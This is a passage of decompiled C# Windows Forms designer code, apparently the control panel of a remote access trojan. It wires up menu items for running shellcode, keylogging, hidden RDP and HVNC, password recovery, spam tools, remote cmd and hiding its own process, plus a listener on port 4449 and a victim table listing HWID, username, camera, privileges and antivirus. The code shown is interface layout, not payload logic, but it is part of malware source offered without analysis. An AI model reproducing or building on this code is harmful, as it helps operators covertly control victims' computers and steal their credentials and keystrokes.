			toolStripMenuItem15.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem15.Image");
			toolStripMenuItem15.Name = "toolStripMenuItem15";
			toolStripMenuItem15.Size = new System.Drawing.Size(219, 36);
			toolStripMenuItem15.Text = "     From Url";
			toolStripMenuItem15.Click += new System.EventHandler(fromUrlToolStripMenuItem_Click);
			toolStripMenuItem16.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem16.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem16.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem16.Image");
			toolStripMenuItem16.Name = "toolStripMenuItem16";
			toolStripMenuItem16.Size = new System.Drawing.Size(219, 36);
			toolStripMenuItem16.Text = "     Send File To Disk";
			toolStripMenuItem16.Click += new System.EventHandler(SendFileToDiskToolStripMenuItem_Click);
			toolStripMenuItem17.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem17.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem17.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem17.Image");
			toolStripMenuItem17.Name = "toolStripMenuItem17";
			toolStripMenuItem17.Size = new System.Drawing.Size(219, 36);
			toolStripMenuItem17.Text = "     Send File To Memory";
			toolStripMenuItem17.Click += new System.EventHandler(SendFileToMemoryToolStripMenuItem_Click);
			toolStripMenuItem18.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem18.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem18.Image = Properties.Resources.IDI_APPICON__2__result;
			toolStripMenuItem18.Name = "toolStripMenuItem18";
			toolStripMenuItem18.Size = new System.Drawing.Size(204, 36);
			toolStripMenuItem18.Text = "     Run Shellcode";
			toolStripMenuItem18.Click += new System.EventHandler(runShellcodeToolStripMenuItem_Click);
			toolStripMenuItem19.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem19.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem19.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem19.Image");
			toolStripMenuItem19.Name = "toolStripMenuItem19";
			toolStripMenuItem19.Size = new System.Drawing.Size(204, 36);
			toolStripMenuItem19.Text = "     MessageBox";
			toolStripMenuItem19.Click += new System.EventHandler(MessageBoxToolStripMenuItem_Click);
			toolStripMenuItem20.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem20.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem20.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem20.Image");
			toolStripMenuItem20.Name = "toolStripMenuItem20";
			toolStripMenuItem20.Size = new System.Drawing.Size(204, 36);
			toolStripMenuItem20.Text = "     Chat Room";
			toolStripMenuItem20.Click += new System.EventHandler(ChatToolStripMenuItem1_Click);
			toolStripMenuItem21.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem21.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem21.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem21.Image");
			toolStripMenuItem21.Name = "toolStripMenuItem21";
			toolStripMenuItem21.Size = new System.Drawing.Size(204, 36);
			toolStripMenuItem21.Text = "     Visit Website";
			toolStripMenuItem21.Click += new System.EventHandler(VisteWebsiteToolStripMenuItem1_Click);
			toolStripMenuItem22.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem22.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem22.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem22.Image");
			toolStripMenuItem22.Name = "toolStripMenuItem22";
			toolStripMenuItem22.Size = new System.Drawing.Size(204, 36);
			toolStripMenuItem22.Text = "     Change Wallpaper";
			toolStripMenuItem22.Click += new System.EventHandler(ChangeWallpaperToolStripMenuItem1_Click);
			toolStripMenuItem23.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem23.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem23.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem23.Image");
			toolStripMenuItem23.Name = "toolStripMenuItem23";
			toolStripMenuItem23.Size = new System.Drawing.Size(204, 36);
			toolStripMenuItem23.Text = "     Keylogger";
			toolStripMenuItem23.Click += new System.EventHandler(KeyloggerToolStripMenuItem1_Click);
			toolStripMenuItem24.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem24.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem24.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem24.Image");
			toolStripMenuItem24.Name = "toolStripMenuItem24";
			toolStripMenuItem24.Size = new System.Drawing.Size(204, 36);
			toolStripMenuItem24.Text = "     File Search";
			toolStripMenuItem24.Click += new System.EventHandler(FileSearchToolStripMenuItem_Click);
			ConnectTimeout.Enabled = true;
			ConnectTimeout.Interval = 5000;
			ConnectTimeout.Tick += new System.EventHandler(ConnectTimeout_Tick);
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.DragEndTransparencyValue = 0.7;
			guna2BorderlessForm1.HasFormShadow = false;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.Transparent;
			LISTVIEWSPANEL1.Controls.Add(guna2PictureBox5);
			LISTVIEWSPANEL1.Controls.Add(buttonspanel);
			LISTVIEWSPANEL1.Controls.Add(label4);
			LISTVIEWSPANEL1.Controls.Add(label3);
			LISTVIEWSPANEL1.Controls.Add(Listener);
			LISTVIEWSPANEL1.Controls.Add(label2);
			LISTVIEWSPANEL1.Controls.Add(guna2Separator2);
			LISTVIEWSPANEL1.Controls.Add(listView1);
			LISTVIEWSPANEL1.Controls.Add(LISTVIEWSPANELSMALL2);
			LISTVIEWSPANEL1.Controls.Add(statusStrip1);
			loadForm.SetDecoration(LISTVIEWSPANEL1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(LISTVIEWSPANEL1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(LISTVIEWSPANEL1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(LISTVIEWSPANEL1, Guna.UI2.AnimatorNS.DecorationType.None);
			LISTVIEWSPANEL1.Dock = System.Windows.Forms.DockStyle.Fill;
			LISTVIEWSPANEL1.Location = new System.Drawing.Point(0, 0);
			LISTVIEWSPANEL1.Name = "LISTVIEWSPANEL1";
			LISTVIEWSPANEL1.ShadowDecoration.Color = System.Drawing.Color.FromArgb(191, 37, 33);
			LISTVIEWSPANEL1.ShadowDecoration.Parent = LISTVIEWSPANEL1;
			LISTVIEWSPANEL1.Size = new System.Drawing.Size(1416, 848);
			LISTVIEWSPANEL1.TabIndex = 6;
			guna2PictureBox5.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox5.BackColor = System.Drawing.Color.Transparent;
			guna2Transition2.SetDecoration(guna2PictureBox5, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2PictureBox5, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2PictureBox5, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(guna2PictureBox5, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2PictureBox5.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox5.Image");
			guna2PictureBox5.ImageRotate = 0f;
			guna2PictureBox5.Location = new System.Drawing.Point(1137, 825);
			guna2PictureBox5.Name = "guna2PictureBox5";
			guna2PictureBox5.ShadowDecoration.Parent = guna2PictureBox5;
			guna2PictureBox5.Size = new System.Drawing.Size(21, 24);
			guna2PictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox5.TabIndex = 19;
			guna2PictureBox5.TabStop = false;
			guna2PictureBox5.UseTransparentBackground = true;
			buttonspanel.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			buttonspanel.Controls.Add(numPort);
			buttonspanel.Controls.Add(btnStopL);
			buttonspanel.Controls.Add(btnStartL);
			loadForm.SetDecoration(buttonspanel, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(buttonspanel, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(buttonspanel, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(buttonspanel, Guna.UI2.AnimatorNS.DecorationType.None);
			buttonspanel.Font = new System.Drawing.Font("Electrolize", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			buttonspanel.Location = new System.Drawing.Point(56, 15);
			buttonspanel.Name = "buttonspanel";
			buttonspanel.ShadowDecoration.Color = System.Drawing.Color.FromArgb(191, 37, 33);
			buttonspanel.ShadowDecoration.Enabled = true;
			buttonspanel.ShadowDecoration.Parent = buttonspanel;
			buttonspanel.Size = new System.Drawing.Size(147, 93);
			buttonspanel.TabIndex = 9;
			buttonspanel.Visible = false;
			buttonspanel.CursorChanged += new System.EventHandler(guna2Panel3_CursorChanged);
			buttonspanel.MouseLeave += new System.EventHandler(guna2Panel3_MouseLeave);
			numPort.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			numPort.BackColor = System.Drawing.Color.Transparent;
			numPort.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			numPort.Cursor = System.Windows.Forms.Cursors.IBeam;
			guna2Transition2.SetDecoration(numPort, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(numPort, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(numPort, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(numPort, Guna.UI2.AnimatorNS.DecorationType.None);
			numPort.DisabledState.Parent = numPort;
			numPort.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			numPort.FocusedState.Parent = numPort;
			numPort.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			numPort.ForeColor = System.Drawing.Color.LightGray;
			numPort.Location = new System.Drawing.Point(0, 59);
			numPort.Maximum = new decimal(new int[4] { 999999, 0, 0, 0 });
			numPort.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
			numPort.Name = "numPort";
			numPort.ShadowDecoration.Parent = numPort;
			numPort.Size = new System.Drawing.Size(148, 27);
			numPort.TabIndex = 142;
			numPort.UpDownButtonFillColor = System.Drawing.Color.FromArgb(191, 37, 33);
			numPort.UpDownButtonForeColor = System.Drawing.Color.White;
			numPort.Value = new decimal(new int[4] { 4449, 0, 0, 0 });
			btnStopL.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			btnStopL.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnStopL.BorderThickness = 1;
			btnStopL.CheckedState.Parent = btnStopL;
			btnStopL.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnStopL.CustomImages.Parent = btnStopL;
			guna2Transition2.SetDecoration(btnStopL, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(btnStopL, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(btnStopL, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(btnStopL, Guna.UI2.AnimatorNS.DecorationType.None);
			btnStopL.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnStopL.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnStopL.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnStopL.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnStopL.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnStopL.DisabledState.Parent = btnStopL;
			btnStopL.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnStopL.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnStopL.Font = new System.Drawing.Font("Electrolize", 9f);
			btnStopL.ForeColor = System.Drawing.Color.White;
			btnStopL.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnStopL.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnStopL.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnStopL.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnStopL.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnStopL.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnStopL.HoverState.Parent = btnStopL;
			btnStopL.Location = new System.Drawing.Point(0, 32);
			btnStopL.Name = "btnStopL";
			btnStopL.ShadowDecoration.Parent = btnStopL;
			btnStopL.Size = new System.Drawing.Size(147, 27);
			btnStopL.TabIndex = 141;
			btnStopL.Text = "Stop Listening";
			btnStopL.Click += new System.EventHandler(btnStopL_Click);
			btnStartL.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			btnStartL.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnStartL.BorderThickness = 1;
			btnStartL.CheckedState.Parent = btnStartL;
			btnStartL.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnStartL.CustomImages.Parent = btnStartL;
			guna2Transition2.SetDecoration(btnStartL, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(btnStartL, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(btnStartL, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(btnStartL, Guna.UI2.AnimatorNS.DecorationType.None);
			btnStartL.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnStartL.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnStartL.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnStartL.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnStartL.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnStartL.DisabledState.Parent = btnStartL;
			btnStartL.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnStartL.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnStartL.Font = new System.Drawing.Font("Electrolize", 9f);
			btnStartL.ForeColor = System.Drawing.Color.White;
			btnStartL.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnStartL.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnStartL.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnStartL.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnStartL.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnStartL.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnStartL.HoverState.Parent = btnStartL;
			btnStartL.Location = new System.Drawing.Point(0, 5);
			btnStartL.Name = "btnStartL";
			btnStartL.ShadowDecoration.Parent = btnStartL;
			btnStartL.Size = new System.Drawing.Size(147, 27);
			btnStartL.TabIndex = 140;
			btnStartL.Text = "Start Listener";
			btnStartL.Click += new System.EventHandler(btnStartL_Click);
			label4.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			label4.AutoSize = true;
			label4.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			loadForm.SetDecoration(label4, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(label4, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(label4, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(label4, Guna.UI2.AnimatorNS.DecorationType.None);
			label4.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label4.Location = new System.Drawing.Point(1033, 828);
			label4.Name = "label4";
			label4.Size = new System.Drawing.Size(81, 15);
			label4.TabIndex = 18;
			label4.Text = "Notifications:";
			label3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			label3.AutoSize = true;
			label3.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			loadForm.SetDecoration(label3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(label3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(label3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(label3, Guna.UI2.AnimatorNS.DecorationType.None);
			label3.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label3.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			label3.Location = new System.Drawing.Point(1114, 828);
			label3.Name = "label3";
			label3.Size = new System.Drawing.Size(23, 15);
			label3.TabIndex = 17;
			label3.Text = "On";
			Listener.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			Listener.AutoSize = true;
			Listener.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			loadForm.SetDecoration(Listener, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(Listener, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(Listener, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(Listener, Guna.UI2.AnimatorNS.DecorationType.None);
			Listener.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			Listener.Location = new System.Drawing.Point(1257, 828);
			Listener.Name = "Listener";
			Listener.Size = new System.Drawing.Size(82, 15);
			Listener.TabIndex = 16;
			Listener.Text = "Not Listening";
			label2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			label2.AutoSize = true;
			label2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			loadForm.SetDecoration(label2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(label2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(label2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(label2, Guna.UI2.AnimatorNS.DecorationType.None);
			label2.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label2.Location = new System.Drawing.Point(1158, 828);
			label2.Name = "label2";
			label2.Size = new System.Drawing.Size(96, 15);
			label2.TabIndex = 15;
			label2.Text = "Listener Status:";
			guna2Separator2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			guna2Separator2.BackColor = System.Drawing.Color.Transparent;
			loadForm.SetDecoration(guna2Separator2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(guna2Separator2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2Separator2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2Separator2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Separator2.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2Separator2.Location = new System.Drawing.Point(0, 816);
			guna2Separator2.Name = "guna2Separator2";
			guna2Separator2.Size = new System.Drawing.Size(1416, 11);
			guna2Separator2.TabIndex = 13;
			guna2Separator2.UseTransparentBackground = true;
			listView1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			listView1.BackgroundImage = (System.Drawing.Image)resources.GetObject("listView1.BackgroundImage");
			listView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
			listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[13]
			{
			lv_ip, lv_country, lv_group, lv_hwid, lv_user, lv_camera, lv_os, lv_version, lv_ins, lv_admin,
			lv_av, lv_ping, lv_act
			});
			listView1.ContextMenuStrip = guna2ContextMenuStrip1;
			guna2Transition3.SetDecoration(listView1, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(listView1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(listView1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(listView1, Guna.UI2.AnimatorNS.DecorationType.None);
			listView1.Dock = System.Windows.Forms.DockStyle.Fill;
			listView1.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			listView1.ForeColor = System.Drawing.Color.WhiteSmoke;
			listView1.FullRowSelect = true;
			listView1.HideSelection = false;
			listView1.Location = new System.Drawing.Point(0, 76);
			listView1.Margin = new System.Windows.Forms.Padding(2);
			listView1.Name = "listView1";
			listView1.OwnerDraw = true;
			listView1.ShowGroups = false;
			listView1.ShowItemToolTips = true;
			listView1.Size = new System.Drawing.Size(1416, 750);
			listView1.TabIndex = 7;
			listView1.UseCompatibleStateImageBehavior = false;
			listView1.View = System.Windows.Forms.View.Details;
			lv_ip.Text = "[DNS/HOST]";
			lv_ip.Width = 104;
			lv_country.Text = "[GEO]";
			lv_country.Width = 108;
			lv_group.Text = "[GROUP]";
			lv_group.Width = 80;
			lv_hwid.Text = "[HWID]";
			lv_hwid.Width = 120;
			lv_user.Text = "[USERNAME]";
			lv_user.Width = 132;
			lv_camera.Text = "[CAM PRESENT]";
			lv_camera.Width = 134;
			lv_os.Text = "[OP SYSTEM]";
			lv_os.Width = 122;
			lv_version.Text = "[PAYLOAD]";
			lv_version.Width = 102;
			lv_ins.Text = "[INSTALLED AT]";
			lv_ins.Width = 85;
			lv_admin.Text = "[PRIVILIGES]";
			lv_admin.Width = 104;
			lv_av.Text = "[PRESENT FIREWALL]";
			lv_av.Width = 82;
			lv_ping.Text = "[NET PING]";
			lv_ping.Width = 116;
			lv_act.Text = "[ACTIVE NOW]";
			lv_act.Width = 126;
			guna2ContextMenuStrip1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2Transition1.SetDecoration(guna2ContextMenuStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(guna2ContextMenuStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(guna2ContextMenuStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2ContextMenuStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2ContextMenuStrip1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			guna2ContextMenuStrip1.ImageScalingSize = new System.Drawing.Size(29, 29);
			guna2ContextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[19]
			{
			tasksControlToolStripMenuItem, toolStripMenuItem1, toolStripMenuItem13, toolStripMenuItem25, toolStripMenuItem33, hiddenRDPToolStripMenuItem, hVNChBrowsersToolStripMenuItem, toolStripMenuItem44, toolStripMenuItem49, passwordRecoveryToolStripMenuItem,
			toolStripMenuItem54, toolStripMenuItem55, toolStripMenuItem56, hIDEPEGASUSPROCESSToolStripMenuItem, watchDogToolStripMenuItem, taskMgrDogToolStripMenuItem, spamToolsToolStripMenuItem, toolStripMenuItem57, toolStripMenuItem58
			});
			guna2ContextMenuStrip1.Margin = new System.Windows.Forms.Padding(3);
			guna2ContextMenuStrip1.Name = "guna2ContextMenuStrip1";
			guna2ContextMenuStrip1.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ContextMenuStrip1.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2ContextMenuStrip1.RenderStyle.ColorTable = null;
			guna2ContextMenuStrip1.RenderStyle.RoundedEdges = true;
			guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
			guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
			guna2ContextMenuStrip1.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
			guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
			guna2ContextMenuStrip1.Size = new System.Drawing.Size(285, 688);
			tasksControlToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { onToolStripMenuItem, offToolStripMenuItem });
			tasksControlToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			tasksControlToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("tasksControlToolStripMenuItem.Image");
			tasksControlToolStripMenuItem.Name = "tasksControlToolStripMenuItem";
			tasksControlToolStripMenuItem.Size = new System.Drawing.Size(284, 36);
			tasksControlToolStripMenuItem.Text = "      [Shedule Tasks Control]";
			tasksControlToolStripMenuItem.Click += new System.EventHandler(tasksControlToolStripMenuItem_Click);
			onToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			onToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			onToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("onToolStripMenuItem.Image");
			onToolStripMenuItem.Name = "onToolStripMenuItem";
			onToolStripMenuItem.Size = new System.Drawing.Size(132, 36);
			onToolStripMenuItem.Text = "     Start";
			onToolStripMenuItem.Click += new System.EventHandler(onToolStripMenuItem_Click);
			offToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			offToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			offToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("offToolStripMenuItem.Image");
			offToolStripMenuItem.Name = "offToolStripMenuItem";
			offToolStripMenuItem.Size = new System.Drawing.Size(132, 36);
			offToolStripMenuItem.Text = "     Stop";
			offToolStripMenuItem.Click += new System.EventHandler(offToolStripMenuItem_Click);
			toolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[13]
			{
			toolStripMenuItem2, toolStripMenuItem3, toolStripMenuItem4, toolStripMenuItem5, toolStripMenuItem6, toolStripMenuItem81, toolStripMenuItem7, toolStripMenuItem8, toolStripMenuItem9, toolStripMenuItem10,
			toolStripMenuItem76, toolStripMenuItem77, toolStripMenuItem79
			});
			toolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem1.Image");
			toolStripMenuItem1.Name = "toolStripMenuItem1";
			toolStripMenuItem1.Size = new System.Drawing.Size(284, 36);
			toolStripMenuItem1.Text = "      [Remote Control]";
			toolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem2.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { cmdToolStripMenuItem, powershellToolStripMenuItem });
			toolStripMenuItem2.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem2.Image");
			toolStripMenuItem2.Name = "toolStripMenuItem2";
			toolStripMenuItem2.Size = new System.Drawing.Size(220, 36);
			toolStripMenuItem2.Text = "     Remote Console";
			cmdToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			cmdToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			cmdToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("cmdToolStripMenuItem.Image");
			cmdToolStripMenuItem.Name = "cmdToolStripMenuItem";
			cmdToolStripMenuItem.Size = new System.Drawing.Size(163, 36);
			cmdToolStripMenuItem.Text = "     Cmd";
			cmdToolStripMenuItem.Click += new System.EventHandler(cmdToolStripMenuItem_Click);
			powershellToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			powershellToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			powershellToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("powershellToolStripMenuItem.Image");
			powershellToolStripMenuItem.Name = "powershellToolStripMenuItem";
			powershellToolStripMenuItem.Size = new System.Drawing.Size(163, 36);
			powershellToolStripMenuItem.Text = "     Powershell";
			powershellToolStripMenuItem.Visible = false;
			powershellToolStripMenuItem.Click += new System.EventHandler(powershellToolStripMenuItem_Click);
			toolStripMenuItem3.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem3.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem3.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem3.Image");
			toolStripMenuItem3.Name = "toolStripMenuItem3";
			toolStripMenuItem3.Size = new System.Drawing.Size(220, 36);
			toolStripMenuItem3.Text = "     Remote Desktop";
			toolStripMenuItem3.Click += new System.EventHandler(RemoteScreenToolStripMenuItem_Click);
			toolStripMenuItem4.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem4.ForeColor = System.Drawing.Color.LightGray;
